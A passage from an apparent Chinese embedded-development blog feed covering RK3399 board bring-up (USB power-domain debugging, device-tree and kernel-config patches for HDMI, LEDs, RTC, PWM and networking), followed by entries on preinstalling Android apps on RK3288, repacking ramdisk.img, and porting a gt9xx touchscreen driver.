供电失败</h2><p>kernel起来了，系统也跑起来了，接下来就是硬件接口配置了，首先测了测USB功能，使用串口设备插入USB接口，发现电源指示灯不亮，说明没有供电。根据原理图找到所有usb接口的电源使能管脚。</p><table><thead><tr><th>gpio</th><th>gpio1_num</th><th>io_num</th><th>description</th></tr></thead><tbody><tr><td><code>GPIO1_B1</code></td><td>gpio1_9</td><td>41</td><td><code>VCC5V0_USB3-1_EN</code></td></tr><tr><td><code>GPIO1_B2</code></td><td>gpio1_10</td><td>42</td><td><code>VCC5V0_USB3-2_EN</code></td></tr><tr><td><code>GPIO1_B5</code></td><td>gpio1_13</td><td>45</td><td><code>VCC5V0_USB3-3_EN</code></td></tr><tr><td><code>GPIO1_C2</code></td><td>gpio1_18</td><td>50</td><td><code>VCC5V0_USB3-4_EN</code></td></tr></tbody></table><p>然后通过 /sys/class/gpio 去使能。</p><pre><code class="bash">#!/bin/bashcd /sys/class/gpio# usb3.0-1~4: 41 42 45 50gpios=(41 42 45 50)for io in $&#123;gpios[@]&#125;do    echo $io &gt; export    echo out &gt; gpio$io/direction    echo 1 &gt; gpio$io/valuedone</code></pre><p>发现每次写入 1 后，读出来还是0，说明IO的输出不受控制，于是我测试了 <code>gpio1</code> 的其它io，部分可控，部分不可控。</p><p>为此，我使用 <code>io</code> 指令，结合 <code>RK3399</code> 寄存器手册，查看 gpio 的复用情况和寄存器配置情况是否正常。</p><h3 id="查询usb-gpio复用功能"><a href="#查询usb-gpio复用功能" class="headerlink" title="查询usb gpio复用功能"></a>查询usb gpio复用功能</h3><p>以 <code>gpio1_Bx</code> 接口为例，在 <code>TRM</code> 文档中搜索 <code>gpio1b</code>， 找到 io 复用寄存器地址。</p><p><img src="/assets/rk3399/pmugrf_gpio1b.png" alt="pmugrf_gpio1b"></p><p>这里有几个关键信息， <code>PMUGRF</code> 将用于查找基地址，offset <code>0x00014</code> 是 <code>PMUGRF_GPIO1B_IOMUX</code> 的偏移量。</p><p>那么如何查找基地址呢？其实文档的第一张图就是地址映射图 <code>Address Mapping</code>。从中可以找到 <code>PMUGRF</code>的基地址，当然也可以找到其它寄存器的基地址。</p><p><img src="/assets/rk3399/pmugrf.png" alt="pmugrf"></p><p>从图中知道基地址为 <code>0xFF320000</code>, 加上偏移量 <code>0x00014</code> 就等于 <code>0xFF320014</code>.</p><p>最后通过 <code>io</code> 指令去查询。</p><pre><code class="bash"># iomux# PMUGRF Base: 0xff320000# PMUGRF_GPIO1B_IOMUX offset: 0x00014# read iomuxroot@firefly:~# io -4 -r 0xff320014ff320014:  00008141</code></pre><p>查询结果是 <code>0x00008141</code>, 这个值该怎么读呢，这个是32位数据，对应gpio1_b0~gpio1_b7 共8个gpio的复用情况。每两个bit代表一个gpio。详情查看TRM文档中 <code>PMUGRF_GPIO1B_IOMUX</code> 寄存器说明。</p><p><img src="/assets/rk3399/gpio1b_iomux.png" alt="gpio1b_iomux"></p><p>对应 <code>0x00008141</code>, 可以解析出每个gpio的复用情况。</p><pre><code class="bash"># 0x8141:      10           00    00    01              01              00    00    01# gpio1_B7~B0: i2c0pmu_scl, gpio, gpio, i2c4sensor_scl, i2c4sensor_sda, gpio, gpio, uart4m0_sout#              B7           B6    B5    B4              B3              B2    B1    B0</code></pre><p>最终查询到USB 3.0 <code>gpio1_b1</code>, <code>gpio1_b2</code> , <code>gpio1_b5</code> 均为 <code>GPIO</code> 模式，没有被复用，说明配置正常。</p><h3 id="查询USB-gpio-value"><a href="#查询USB-gpio-value" class="headerlink" title="查询USB gpio value"></a>查询USB gpio value</h3><p>既然复用寄存器没有问题，那再来看看 gpio value配置，看看使用 <code>sys/class/gpio/gpioxx/value</code> 配置有没有生效。</p><p>与查询复用情况类似，首先找到 <code>gpio1</code>的基地址。</p><p><img src="/assets/rk3399/gpio1_base.png" alt="gpio1_base"></p><p>基地址为 <code>0xFF730000</code>, 接着查看gpio 数据寄存器 <code>GPIO_SWPORTA_DR  </code> 的偏移量。</p><p><img src="/assets/rk3399/gpio_dr_offset.png" alt="gpio1_offset"></p><p><code>DR</code> 寄存器偏移量为 <code>0x0000</code>, 32位寄存器对应gpio1 32个gpio的数据。接下来使用 <code>io</code> 指令查询。</p><pre><code class="bash"># gpio1 base: 0xff730000# DR offset: 0x00000000# DDR offset: 0x00000004# read DRroot@firefly:~# io -4 -r 0xff730000ff730000:  00042602# 0x42602: 0x0100 0010 0110 0000 0010#               C0        B0        A0# read DDRroot@firefly:~# io -4 -r 0xff730004ff730004:  00062602# 0x62602: 0x0110 0010 0110 0000 0010#               C0        B0        A0# 说明 gpio 的 direction, value 均配置正常</code></pre><p>以上查询到 <code>DR</code> 和 <code>DDR</code> 的配置情况，均正常。</p><h3 id="USB-3-0-gpio-电源域配置"><a href="#USB-3-0-gpio-电源域配置" class="headerlink" title="USB 3.0 gpio 电源域配置"></a>USB 3.0 gpio 电源域配置</h3><p>到此为止，io配置、io查询、复用功能确认都正常，但是实际输出就是不对。最后只能在 <code>RK</code> redmine 系统中提交issues，根据他们提供的技术文档，发现io输出不受控的问题可能与电源域配置有关。</p><p>首先查看原理图，gpio1 的电源接口。</p><p><img src="/assets/rk3399/gpio1_power.png" alt="gpio1_power"></p><p>gpio1 使用 <code>PMUIO2</code> 电源，电压1.8v。然后查看 dts 中的配置。发现是 <code>3.0v</code>, 果然不一样！</p><pre><code class="bash">       uboot-set = &lt;RK3399_PMU1830_VDD_3V0&gt;;       pmu1830-supply = &lt;&amp;vcc_3v0&gt;;</code></pre><p>既然问题找到了，那解决方案就很明显了。</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>修改 <code>pmu1830</code> 电源域配置。修改后，USB3.0 供电一切正常。</p><pre><code class="bash">--- a/arch/arm64/boot/dts/rockchip/rk3399-firefly-linux.dts+++ b/arch/arm64/boot/dts/rockchip/rk3399-firefly-linux.dts@@ -866,8 +866,8 @@         * also list here for more convenient configuration:         * pmu1830-supply: RK3399_PMU1830_VDD_1V8 or RK3399_PMU1830_VDD_3V0         */-       uboot-set = &lt;RK3399_PMU1830_VDD_3V0&gt;;-       pmu1830-supply = &lt;&amp;vcc_3v0&gt;;+       uboot-set = &lt;RK3399_PMU1830_VDD_1V8&gt;;+       pmu1830-supply = &lt;&amp;vcc_1v8&gt;; &#125;; &amp;pinctrl &#123;</code></pre><h2 id="USB-2-0-无法识别串口设备"><a href="#USB-2-0-无法识别串口设备" class="headerlink" title="USB 2.0 无法识别串口设备"></a>USB 2.0 无法识别串口设备</h2><p><code>USB3.0</code> 问题是电源域的问题， <code>USB2.0</code> 则不太一样， <code>USB2.0</code> 供电正常，但是无法识别设备，而且不是所有接口都不能识别，两个接口，一个可以，一个不可以，但是它们共用一个usb hub，没道理会这样。最终由我老大发现是硬件问题，老大通过修改硬件电路解决了，perfect!</p><h2 id="TypeC-接口配置"><a href="#TypeC-接口配置" class="headerlink" title="TypeC 接口配置"></a>TypeC 接口配置</h2><p>DTS默认的typec的电源使能接口 <code>vbus-5v-gpios</code> 配置与原理图中是不匹配的，需要更正一下。</p><pre><code class="bash">--- a/arch/arm64/boot/dts/rockchip/rk3399-firefly-linux.dts+++ b/arch/arm64/boot/dts/rockchip/rk3399-firefly-linux.dts@@ -739,7 +739,7 @@                pinctrl-names = &quot;default&quot;;                pinctrl-0 = &lt;&amp;fusb0_int&gt;;                int-n-gpios = &lt;&amp;gpio1 2 GPIO_ACTIVE_HIGH&gt;;-               vbus-5v-gpios = &lt;&amp;gpio2 0 GPIO_ACTIVE_HIGH&gt;;+               vbus-5v-gpios = &lt;&amp;gpio1 3 GPIO_ACTIVE_HIGH&gt;;                status = &quot;okay&quot;;        &#125;;</code></pre><h2 id="以太网配置"><a href="#以太网配置" class="headerlink" title="以太网配置"></a>以太网配置</h2><p>工控机包含两个以太网，默认千兆网没有打开，需要使能 <code>gmac</code>, 使能后，两个网口皆开，对应 eth0, eth1. 但是eth0 打开up失败。</p><pre><code class="bash">root@firefly:~# ifconfig eth0 up[  128.132426] stmmac_open: Cannot attach to PHY (error: -19)SIOCSIFFLAGS: No such device</code></pre><p>最后排查是被其它设备占用io，禁用 <code>uart1</code>, <code>uart3</code> 后正常。</p><h3 id="brctl-失败"><a href="#brctl-失败" class="headerlink" title="brctl 失败"></a>brctl 失败</h3><p>由于包含两个网口，可能会用到网桥功能，我安装 <code>brctl</code> 后却发现无法使用, 提示参数错误。使用 <code>strace</code> 排查。</p><pre><code class="bash">root@firefly:~# brctl addbr br0add bridge failed: Invalid argumentroot@firefly:~# strace brctl addbr br0execve(&quot;/sbin/brctl&quot;, [&quot;brctl&quot;, &quot;addbr&quot;, &quot;br0&quot;], [/* 18 vars */]) = 0brk(0)                                  = 0x766000uname(&#123;sys=&quot;Linux&quot;, node=&quot;firefly&quot;, ...&#125;) = 0access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7237000access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)open(&quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3fstat64(3, &#123;st_mode=S_IFREG|0644, st_size=62149, ...&#125;) = 0mmap2(NULL, 62149, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf720a000close(3)                                = 0access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)open(&quot;/lib/arm-linux-gnueabihf/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3read(3, &quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0(\0\1\0\0\0\215w\1\0004\0\0\0&quot;..., 512) = 512lseek(3, 908188, SEEK_SET)              = 908188read(3, &quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;..., 2880) = 2880lseek(3, 904740, SEEK_SET)              = 904740read(3, &quot;A4\0\0\0aeabi\0\1*\0\0\0\0057-A\0\6\n\7A\10\1\t\2\n\3\f&quot;..., 53) = 53fstat64(3, &#123;st_mode=S_IFREG|0755, st_size=911068, ...&#125;) = 0mmap2(NULL, 947624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7122000mprotect(0xf71fd000, 28672, PROT_NONE)  = 0mmap2(0xf7204000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xda000) = 0xf7204000mmap2(0xf7207000, 9640, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7207000close(3)                                = 0mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7236000set_tls(0xf7236850, 0xf723a058, 0xf7236f38, 0xf7236850, 0xf723a058) = 0mprotect(0xf7204000, 8192, PROT_READ)   = 0mprotect(0x14000, 4096, PROT_READ)      = 0mprotect(0xf7239000, 4096, PROT_READ)   = 0munmap(0xf720a000, 62149)               = 0socket(PF_LOCAL, SOCK_STREAM, 0)        = 3ioctl(3, SIOCBRADDBR, 0xffb29954)       = -1 ENOPKG (Package not installed)ioctl(3, SIOCSIFBR, 0xffb28848)         = -1 EINVAL (Invalid argument)write(2, &quot;add bridge failed: Invalid argum&quot;..., 36add bridge failed: Invalid argument) = 36exit_group(1)                           = ?+++ exited with 1 +++root@firefly:~#</code></pre><p>定位到 <code>ENOPKG</code> 错误，提示 <code>package not installed</code></p><pre><code class="bash">socket(PF_LOCAL, SOCK_STREAM, 0)        = 3ioctl(3, SIOCBRADDBR, 0xffb29954)       = -1 ENOPKG (Package not installed)ioctl(3, SIOCSIFBR, 0xffb28848)         = -1 EINVAL (Invalid argument)</code></pre><p>搜索相关信息得知是内核配置不包含 <code>CONFIG_BRIDGE</code> 所致，添加该选项并重新编译内核后解决。 <code>brctl</code> 正常执行。</p><pre><code class="bash">brctl addbr br0brctl addif br0 eth0brctl addif br0 eth1ifconfig br0 192.168.64.20 up</code></pre><h2 id="添加-USB-wifi-支持"><a href="#添加-USB-wifi-支持" class="headerlink" title="添加 USB wifi 支持"></a>添加 USB wifi 支持</h2><p>由于工控机不自带wifi模块，可能会用到usb wifi网卡，所以需要添加驱动支持。</p><pre><code class="bash">--- a/arch/arm64/configs/rockchip_linux_defconfig+++ b/arch/arm64/configs/rockchip_linux_defconfig@@ -173,12 +173,13 @@ CONFIG_USB_NET_CDC_MBIM=y # CONFIG_USB_NET_ZAURUS is not set CONFIG_LIBERTAS_THINFIRM=y CONFIG_USB_NET_RNDIS_WLAN=y+CONFIG_RTL8188EE=y CONFIG_RTL8192CU=y CONFIG_WL_ROCKCHIP=y CONFIG_WIFI_BUILD_MODULE=y CONFIG_WIFI_LOAD_DRIVER_WHEN_KERNEL_BOOTUP=y CONFIG_AP6XXX=y-CONFIG_RTL8188EU=m+CONFIG_RTL8188EU=y CONFIG_MWIFIEX=y CONFIG_MWIFIEX_SDIO=y CONFIG_LTE=y</code></pre><h2 id="添加状态指示灯"><a href="#添加状态指示灯" class="headerlink" title="添加状态指示灯"></a>添加状态指示灯</h2><p>工控机包含两个led，其中一个电源指示灯，常亮，无需配置；另一个user led，需要修改dts支持。结合原理图找到对应管脚 <code>gpio4_c2</code>。</p><pre><code class="bash">--- a/arch/arm64/boot/dts/rockchip/rk3399-firefly-linux.dts+++ b/arch/arm64/boot/dts/rockchip/rk3399-firefly-linux.dts@@ -152,6 +152,20 @@                &#125;;        &#125;;+       leds &#123;+               status = &quot;okay&quot;;+               compatible = &quot;gpio-leds&quot;;++               user &#123;+                       label = &quot;led_ctl&quot;;+                       linux,default-trigger = &quot;ir-user-click&quot;;+                       gpios = &lt;&amp;gpio4 18 GPIO_ACTIVE_HIGH&gt;;+                       pinctrl-names = &quot;default&quot;;+                       pinctrl-0 = &lt;&amp;led_user&gt;;+                       default-state = &quot;on&quot;;+               &#125;;+       &#125;;+        rt5640-sound &#123;                compatible = &quot;simple-audio-card&quot;;                simple-audio-card,format = &quot;i2s&quot;;@@ -857,6 +871,12 @@ &#125;;                                                                                                             &amp;pinctrl &#123;+       leds &#123;+               led_user: led-user &#123;+                       rockchip,pins = &lt;4 18 RK_FUNC_GPIO &amp;pcfg_pull_up&gt;;+               &#125;;+       &#125;;+        buttons &#123;                pwrbtn: pwrbtn &#123;                        rockchip,pins = &lt;0 5 RK_FUNC_GPIO &amp;pcfg_pull_up&gt;;</code></pre><p>使能 <code>gpio-leds</code> 驱动后，可以通过 <code>/sys/class/leds/led_ctrl/brightness</code> 文件修改亮灯状态，为了让其闪烁，可以添加开机启动脚本。</p><pre><code class="bash">#!/bin/bashctl_file=/sys/class/leds/led_ctl/brightnessdelay_sec=0.3while truedo  echo 1 &gt; $ctl_file  sleep $delay_sec  echo 0 &gt; $ctl_file  sleep $delay_secdone</code></pre><h2 id="RTC-配置"><a href="#RTC-配置" class="headerlink" title="RTC 配置"></a>RTC 配置</h2><p>工控机外挂了 <code>hym8563</code> RTC芯片，需要外接一个纽扣电池，并在 <code>DTS</code> 添加支持。</p><pre><code class="bash">--- a/arch/arm64/boot/dts/rockchip/rk3399-firefly-linux.dts+++ b/arch/arm64/boot/dts/rockchip/rk3399-firefly-linux.dts@@ -453,6 +453,16 @@        i2c-scl-falling-time-ns = &lt;4&gt;;        clock-frequency = &lt;400000&gt;;+       hym8563: hym8563@51 &#123;+               compatible = &quot;haoyu,hym8563&quot;;+               reg = &lt;0x51&gt;;+               #clock-cells = &lt;0&gt;;++               clock-frequency = &lt;32768&gt;;+               /* rtc_int is connected GPIO1_C6 */+       &#125;;+        vdd_cpu_b: syr837@40 &#123;                compatible = &quot;silergy,syr837&quot;;                reg = &lt;0x40&gt;;</code></pre><p>添加后无法正常使用，修改时间后无法保存，最终发现是硬件问题。</p><h2 id="PWM配置"><a href="#PWM配置" class="headerlink" title="PWM配置"></a>PWM配置</h2><p>根据原理图可知，工控机引出的 <code>pwm</code> 采用 <code>pwm3a</code> , 所以<code>dts</code> 中需要enable <code>pwm3</code>. 然后可以通过以下指令对 <code>pwm</code> 波进行配置。</p><pre><code class="bash">cd /sys/class/pwm/pwmchip1echo 0 &gt; exportecho 50000 &gt; pwm0/periodecho 25000 &gt; pwm0/duty_cycleecho 1 &gt; pwm0/enable</code></pre><p>其中 <code>period</code> 代表 pwm 波的周期，单位 <code>ns</code>, <code>duty_cycle</code> 对应占空比，以上配置为 <code>50%</code>.</p><blockquote><p><strong>注意</strong>，这里用的是 <code>pwmchip1</code>, 而不是 <code>pwmchip0</code>, 因为 <code>pwmchip0</code> 对应 <code>pwm2</code>, 而 <code>pwm2</code> 被 <code>vdd_log</code> 引用，用于电源电压管理。</p></blockquote><h2 id="HDMI-无法显示"><a href="#HDMI-无法显示" class="headerlink" title="HDMI 无法显示"></a>HDMI 无法显示</h2><p>最后来看个大问题，<code>HDMI</code> 无法显示，首先确保<code>hdmi</code> ， <code>route_hdmi</code>, <code>display_subsystem</code> 等相关配置已经使能。使用 <code>Firefly</code> 固件编译是可以正常显示的，但是 <code>RK</code> 固件编译却不行。</p><p>一开始想着可能是io配置问题，但是禁用了其它外设后还是不行。不过既然 <code>Firefly</code> 的可以，那就可以对比了，为了确认是dts问题，还是内核驱动配置问题。我将 <code>Firefly</code> 的dts移植到 <code>RK</code> 固件，修改了部分选项后编译通过，而且 <code>HDMI</code> 正常显示了。这说明的确是 <code>DTS</code> 配置问题，与内核驱动配置无关。</p><p>接下来我将 <code>firefly</code> 的 <code>dts</code> 检查了一遍，禁用了其中的可疑选项后，<code>HDMI</code>又不能显示了，这说明我禁用的选项与 <code>HDMI</code> 显示有关，于是我将这个改动也添加到 <code>RK</code> 的 <code>dts</code>中。</p><pre><code class="bash">                        vcca1v8_codec: LDO_REG7 &#123;                                regulator-always-on;                                regulator-boot-on;-                               regulator-min-microvolt = &lt;1800000&gt;;-                               regulator-max-microvolt = &lt;1800000&gt;;+                               regulator-min-microvolt = &lt;900000&gt;;+                               regulator-max-microvolt = &lt;900000&gt;;                                regulator-name = &quot;vcca1v8_codec&quot;;                                regulator-state-mem &#123;                                        regulator-off-in-suspend;</code></pre><p>也就是 <code>rk808</code> 电源管理芯片中的 <code>vcca1v8_codec</code> 配置，将默认的 <code>1.8v</code> 改为 <code>0.9v</code>，至此，<code>hdmi</code> 正常显示。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>耗时两周左右的配置过程，让我遇到不少坑，以上总结的是其中的主要部分，还有很多小问题没有记录。总的来说，问题不少，但总算都解决了，也学到不少知识。</p><ol><li>假定软件问题的情况下，优先排查 <code>dts</code> 配置，再看驱动配置</li><li>新设计的板子，可以将 <code>gpio</code> 配置列表整理，方便查阅</li><li>在dts中添加新设备时，可以参考当前dts外其它设备的配置信息，或者参考 <code>Documents/devicetree/bindings/</code> 中的文档</li><li>在出现io输出不可控的时候，优先考虑io复用及电源域配置问题</li><li>通过查询寄存器手册，结合 <code>io</code> 指令可以查看或者修改寄存器配置</li><li>在确保软件配置无误情况下，如果仍旧异常，考虑硬件问题</li><li> <code>Firefly SDK</code> 编译后始终无法启动，但 <code>RK SDK</code> 中使用 <code>Firefly</code>的 <code>dts</code> 却可以正常启动，所以优先使用 <code>RK</code> 官方 <code>SDK</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> rk3399 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RK3288 android 6.0 内置系统应用</title>
      <link href="2021/10/27/system-app/"/>
      <url>2021/10/27/system-app/</url>
      
        <content type="html"><![CDATA[<p>安卓系统的内置应用可分为以下两大类：</p><ol><li>可卸载的普通应用</li><li>不可卸载的系统应用，可以在首次烧录后自启动</li></ol><h2 id="可卸载应用"><a href="#可卸载应用" class="headerlink" title="可卸载应用"></a>可卸载应用</h2><p>对于可卸载应用，其内置很简单，只需要将apk文件放置在指定目录即可。</p><pre><code class="bash">cp My_application.apk device/rockchip/rk3288/preinstall_del/</code></pre><h2 id="不可卸载应用"><a href="#不可卸载应用" class="headerlink" title="不可卸载应用"></a>不可卸载应用</h2><p>针对不可卸载的系统应用，复杂一些，需要放置在 <code>packages/apps</code> 目录，具体操作如下：</p><pre><code class="bash">apk_file=My_application.apkinstall_dir=packages/apps/$&#123;apk_file&#125;mkdir $&#123;install_dir&#125;cp $&#123;apk_file&#125; $&#123;install_dir&#125;# 解压出lib文件cd $&#123;install_dir&#125;unzip $&#123;apk_file&#125; -d tmpmv tmp/lib .rm -rf tmpcd -# vi Android.mk</code></pre><h3 id="新建-Android-mk"><a href="#新建-Android-mk" class="headerlink" title="新建 Android.mk"></a>新建 Android.mk</h3><p>注意修改以下 <code>Android.mk</code> 文件中的 <code>LOCAL_MODULE</code> 文件 <code>apk</code> 文件名前缀。</p><pre><code class="makefile">LOCAL_PATH := $(call my-dir)include $(CLEAR_VARS)LOCAL_MODULE := My_applicationLOCAL_MODULE_CLASS := APPSLOCAL_MODULE_TAGS := optionalLOCAL_BUILT_MODULE_STEM := package.apkLOCAL_SRC_FILES := $(LOCAL_MODULE).apk$(shell mkdir -p $(PRODUCT_OUT)/system/lib)$(shell cp -rf $(LOCAL_PATH)/lib/armeabi/*  $(PRODUCT_OUT)/system/lib)LOCAL_MODULE_SUFFIX := $(COMMON_ANDROID_PACKAGE_SUFFIX)LOCAL_PRIVILEGED_MODULE := falseLOCAL_CERTIFICATE := PRESIGNEDinclude $(BUILD_PREBUILT)</code></pre><h3 id="更新-device-mk"><a href="#更新-device-mk" class="headerlink" title="更新 device.mk"></a>更新 device.mk</h3><p>在文件 <code>device/rockchip/common/device.mk</code> 中添加以下内容，这样才能将应用编译至系统固件。</p><pre><code class="bash">PRODUCT_PACKAGES += My_application</code></pre><p>最后重新编译系统固件即可。</p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ol><li>普通应用将安装在 <code>/data/</code> 目录</li><li>系统应用分以下两种情况<ol><li><code>Android.mk</code> 中 <code>LOCAL_PRIVILEGED_MODULE</code> 为false，则安装在 <code>/system/app</code> 目录</li><li><code>Android.mk</code> 中 <code>LOCAL_PRIVILEGED_MODULE</code> 为true，则安装在 <code>/system/priv-app</code> 目录</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解压并更新 ramdisk.img 或 initrd.img</title>
      <link href="2021/07/31/ramdisk/"/>
      <url>2021/07/31/ramdisk/</url>
      
        <content type="html"><![CDATA[<p><code>ramdisk.img</code> 或者 <code>initrd.img</code> 是类似的，都是一个小型的文件系统。在系统启动过程中起到引导的作用，内核通过它来启动真正的根文件系统。</p><p>有时候需要修改并更新这个文件，下面以<code>ramdisk.img</code> 为例进行说明。</p><h2 id="解压-ramdisk-img"><a href="#解压-ramdisk-img" class="headerlink" title="解压 ramdisk.img"></a>解压 ramdisk.img</h2><p><code>ramdisk.img</code> 其实是一个<code>gz</code>格式的压缩包，可以通过 <code>gzip -d</code> 或者 <code>gunzip</code> 解压，不过需要注意的是 <code>gzip</code>, <code>gunzip</code> 会检查文件名后缀，所以需要先将后缀更新为 <code>.gz</code>. 下面将其解压至新建的 <code>root</code> 目录。</p><pre><code class="bash">$ cp ramdisk.img ramdisk.gz$ gzip -d ramdisk.gz$ mkdir root$ mv ramdisk root$ cd root$ cpio -i -F ramdisk$ rm ramdisk$ ls -Fbin/  conf/  etc/  init*  lib/  run/  sbin/  scripts/  usr/  var/</code></pre><p>之后只需要在 root 目录更新即可，增添、删除、修改均可。</p><h2 id="更新-ramdisk-img"><a href="#更新-ramdisk-img" class="headerlink" title="更新 ramdisk.img"></a>更新 ramdisk.img</h2><p>修改完成后需要重新生成 <code>ramdisk.img</code> ，步骤如下。</p><pre><code class="bash">find . |cpio -o -H newc -O ../ramdiskcd ..gzip -v9 ramdiskmv ramdisk.gz ramdisk.img</code></pre><p>这样就完成了。</p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>嵌入式系统下的 <code>ramdisk</code> 有其特定的文件格式，比如 <code>arm</code> 平台，还分 <code>armhf</code> 和 <code>aarch64</code> 两个版本，需要添加相同架构的文件才能正确执行。</p>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RK3288 android 6.0 移植 gt9xx 驱动</title>
      <link href="2021/07/16/gt9xx-drvier/"/>
      <url>2021/07/16/gt9xx-drvier/</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><ul><li>平台：RK3288</li><li>系统：Android 6.0</li><li>需求：触摸屏驱动移植</li></ul><h2 id="驱动移植"><a href="#驱动移植" class="headerlink" title="驱动移植"></a>驱动移植</h2><p>先从厂商获取驱动程序 gt9xx_v2.8.0.2.</p><pre><code class="bash">gt9xx_v2.8.0.2├── dtsi│   ├── gt9xx_dts.txt│   ├── pinctrl_mtk.txt│   └── pinctrl_qcom.txt├── goodix_tool.c├── gt9xx.c├── gt9xx.h├── gt9xx_update.c├── Kconfig└── Makefile</code></pre><p>新建目录 <code>drivers/input/touchscreen/gt9xx_v2.8.0.2/</code> ,将以上 <code>.c</code>, <code>.h</code>, 及 <code>Makefile</code>文件放入该目录。</p><h3 id="修改-Kconfig"><a href="#修改-Kconfig" class="headerlink" title="修改 Kconfig"></a>修改 Kconfig</h3><p>将提供的Kconfig内容添加到以下文件</p><ul><li><code>drivers/input/touchscreen/Kconfig</code></li></ul><pre><code class="c">## Goodix GT9xx Touchscreen driver#config TOUCHSCREEN_GT9XX_V28        bool &quot;Goodix touchpanel GT9xx series&quot;        depends on I2C        help          Say Y here if you have a Goodix GT9xx touchscreen          controller.          If unsure, say N.config TOUCHSCREEN_GT9XX_UPDATE        tristate &quot;Goodix GT9xx touch controller auto update support&quot;        depends on TOUCHSCREEN_GT9XX_V28        default y        help          Enable this for support firmware update.          Say Y here if you want update touch controller firmware.          If unsure, say N.config TOUCHSCREEN_GT9XX_TOOL        tristate &quot;Goodix GT9xx Tools for debuging&quot;        depends on TOUCHSCREEN_GT9XX_V28        default y        help          This implement interface support for Goodix GT9xx          touchscreen debug.          Say Y here if you want to have a Android app debug interface          to your system.          If unsure, say N.</code></pre><p>由于原文件中的<code>TOUCHSCREEN_GT9XX</code>已经存在了，所以将其更名为<code>TOUCHSCREEN_GT9XX_V28</code></p><h3 id="修改-Makefile"><a href="#修改-Makefile" class="headerlink" title="修改 Makefile"></a>修改 Makefile</h3><ul><li><code>drivers/input/touchscreen/gt9xx_v2.8.0.2/Makefile</code></li></ul><p>将 <code>Makefile</code> 中默认的 <code>CONFIG_TOUCHSCREEN_GT9XX</code> 改为 <code>CONFIG_TOUCHSCREEN_GT9XX_V28</code></p><pre><code class="makefile">obj-$(CONFIG_TOUCHSCREEN_GT9XX_V28)             += gt9xx.oobj-$(CONFIG_TOUCHSCREEN_GT9XX_UPDATE)  += gt9xx_update.oobj-$(CONFIG_TOUCHSCREEN_GT9XX_TOOL)    += goodix_tool.o</code></pre><h3 id="修改-rockchip-defconfig"><a href="#修改-rockchip-defconfig" class="headerlink" title="修改 rockchip_defconfig"></a>修改 rockchip_defconfig</h3><p>修改内核配置，替换原有的 <code>GT9XX_V24</code> 的驱动</p><ul><li><code>arch/arm/configs/rockchip_defconfig</code></li></ul><pre><code class="c">-CONFIG_TOUCHSCREEN_GT9XX_V24=y+# CONFIG_TOUCHSCREEN_GT9XX_V24 is not set+CONFIG_TOUCHSCREEN_GT9XX_V28=y+CONFIG_TOUCHSCREEN_GT9XX_UPDATE=y                                              +CONFIG_TOUCHSCREEN_GT9XX_TOOL=y</code></pre><h2 id="修改设备树"><a href="#修改设备树" class="headerlink" title="修改设备树"></a>修改设备树</h2><p>由于新的驱动依赖新的设备树，所以需要添加以下内容，该内容可以从厂商给的 <code>dtsi</code> 目录获取，但是要修改某些参数。</p><p>下面的<code>goodix_ts@5d</code> 是旧的驱动所用，将其状态改为 <code>disabled</code>, 并添加新的 <code>goodix_ts_v28@5d</code>.</p><pre><code class="c">&amp;i2c4 &#123;        status = &quot;okay&quot;;        goodix_ts@5d &#123;                status = &quot;disabled&quot;;                compatible = &quot;goodix,gt1x&quot;, &quot;goodix,gt9xx&quot;;             // gt5688, gt911                reg = &lt;0x5d&gt;;                goodix,rst-gpio = &lt;&amp;gpio7 GPIO_A5 GPIO_ACTIVE_LOW&gt;;                goodix,irq-gpio = &lt;&amp;gpio7 GPIO_A6 IRQ_TYPE_EDGE_FALLING&gt;;        &#125;;        goodix_ts_v28@5d &#123;                //status = &quot;disabled&quot;;                compatible = &quot;goodix,gt9xx&quot;;                reg = &lt;0x5d&gt;;                 reset-gpios = &lt;&amp;gpio7 GPIO_A5 GPIO_ACTIVE_LOW&gt;;                irq-gpios = &lt;&amp;gpio7 GPIO_A6 IRQ_TYPE_EDGE_FALLING&gt;;                irq-flags = &lt;2&gt;;                //touchscreen-max-id = &lt;11&gt;;                //touchscreen-size-x = &lt;600&gt;;                //touchscreen-size-y = &lt;1024&gt;;                goodix,slide-wakeup = &lt;0&gt;;                goodix,type-a-report = &lt;0&gt;;                goodix,driver-send-cfg = &lt;1&gt;;                goodix,resume-in-workqueue = &lt;0&gt;;                goodix,int-sync = 